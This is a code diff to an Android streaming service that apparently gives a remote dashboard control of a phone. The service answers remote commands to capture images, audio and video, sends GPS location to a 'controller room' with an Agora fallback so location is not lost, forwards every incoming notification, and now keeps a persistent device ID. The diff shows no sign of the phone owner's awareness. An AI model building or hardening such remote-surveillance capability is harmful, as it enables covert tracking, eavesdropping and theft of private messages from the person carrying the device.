@@ -9,6 +9,7 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.hardware.camera2.CameraAccessException;
@@ -160,7 +161,20 @@ public class StreamingService extends Service {
             return;
         }
 
-        deviceId = UUID.randomUUID().toString().substring(0, 8);
+        // FIX Bug 4 — Stable deviceId persisted in SharedPreferences.
+        // Old code: deviceId = UUID.randomUUID().toString().substring(0, 8);
+        // That generated a brand-new 8-char ID on every service restart, making
+        // the device appear as a new entry in the dashboard and Firebase on every
+        // reconnect. Now we persist the ID on first run and reuse it forever.
+        SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
+        deviceId = prefs.getString("stable_device_id", null);
+        if (deviceId == null) {
+            deviceId = UUID.randomUUID().toString().substring(0, 8);
+            prefs.edit().putString("stable_device_id", deviceId).apply();
+            Log.d(TAG, "New stable deviceId generated and persisted: " + deviceId);
+        } else {
+            Log.d(TAG, "Reusing persisted deviceId: " + deviceId);
+        }
 
         cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
         try {
@@ -618,8 +632,6 @@ public class StreamingService extends Service {
     // =========================================================================
 
     // FIX Bug 9 — Use AtomicBoolean.compareAndSet() to eliminate race condition.
-    // The old boolean flag was set to false BEFORE async createAndSendOffer() completed,
-    // allowing a second fullReconnect() to fire while the first offer was mid-flight.
     private void fullReconnect() {
         if (!isReconnecting.compareAndSet(false, true)) {
             Log.d(TAG, "fullReconnect already in progress — skipping");
@@ -631,8 +643,6 @@ public class StreamingService extends Service {
             setupPeerConnection();
             if (webClientId != null) createAndSendOffer();
         } finally {
-            // Reset flag only after offer creation completes (or we couldn't start)
-            // Since createAndSendOffer() is async, we delay reset slightly
             mainHandler.postDelayed(() -> isReconnecting.set(false), 3000);
         }
     }
@@ -740,7 +750,6 @@ public class StreamingService extends Service {
             switchCamera();
         // ---------------------------------------------------------------
         // FIX: Wire capture-image / capture-audio / capture-video to CaptureManager
-        // These events are sent by the dashboard and relayed by Node server
         // ---------------------------------------------------------------
         }).on("capture-image", args -> {
             if (captureManager == null) return;
@@ -877,7 +886,6 @@ public class StreamingService extends Service {
 
     // =========================================================================
     // Location
-    // FIX Bug 8 — sendLocation now includes deviceId so server can route to correct controller room
     // =========================================================================
 
     private void startLocationUpdatesIfAllowed() {
@@ -896,21 +904,31 @@ public class StreamingService extends Service {
     }
 
     private void sendLocation(double lat, double lng) {
-        // FIX Bug 10 — null-check socket before use
-        if (socket == null || !socket.connected()) {
-            Log.w(TAG, "Socket null/disconnected — location dropped");
-            return;
-        }
         if (webClientId == null) return;
         try {
             JSONObject d = new JSONObject();
             d.put("deviceId",  deviceId);
-            d.put("from",      socket.id());
-            d.put("to",        webClientId);
             d.put("latitude",  lat);
             d.put("longitude", lng);
             d.put("time",      System.currentTimeMillis());
-            socket.emit("location", d);
+
+            if (socket != null && socket.connected()) {
+                // Primary path: Socket.IO
+                d.put("from", socket.id());
+                d.put("to",   webClientId);
+                socket.emit("location", d);
+            } else if (usingAgoraSignal) {
+                // FIX Bug 6/10 — GPS no longer silently dropped when Agora fallback is active.
+                // Wrap payload in a signaling envelope so handleAgoraMessage() can parse it
+                // identically to a Socket.IO "location" event on the receiving dashboard.
+                JSONObject envelope = new JSONObject();
+                envelope.put("type",    "location");
+                envelope.put("payload", d);
+                sendViaAgora(envelope.toString());
+                Log.d(TAG, "Location sent via Agora fallback");
+            } else {
+                Log.w(TAG, "sendLocation: no channel available — GPS dropped");
+            }
         } catch (JSONException e) { Log.e(TAG, "Location send fail", e); }
     }
 
@@ -1152,13 +1170,10 @@ public class StreamingService extends Service {
 
     // =========================================================================
     // FIX Bug 7 — NotificationListener: Share parent service socket instead of
-    // creating its own isolated socket and webClientId.
-    // NotificationListenerService runs as a separate process, so we cannot share
-    // the socket object directly. Instead, we use a static callback reference so
-    // the parent StreamingService handles the actual socket emission.
+    // creating its own isolated socket. Uses static callback so parent service
+    // handles all socket emission.
     // =========================================================================
 
-    /** Called by NotificationListener to relay notifications through the parent service's socket. */
     static volatile NotificationEmitCallback sNotificationCallback = null;
 
     interface NotificationEmitCallback {
@@ -1173,8 +1188,6 @@ public class StreamingService extends Service {
         public void onCreate() {
             super.onCreate();
             Log.d(TAG2, "NotificationListener created");
-            // FIX Bug 7: No separate socket. Notifications are routed via
-            // StreamingService.sNotificationCallback which is set in connectSignaling().
         }
 
         private void sendActiveNotifications() {
@@ -1187,7 +1200,7 @@ public class StreamingService extends Service {
         @Override
         public void onNotificationPosted(StatusBarNotification sbn) {
             NotificationEmitCallback cb = StreamingService.sNotificationCallback;
-            if (cb == null) return; // Parent service not connected yet
+            if (cb == null) return;
             try {
                 Notification n = sbn.getNotification();
                 JSONObject d = new JSONObject();
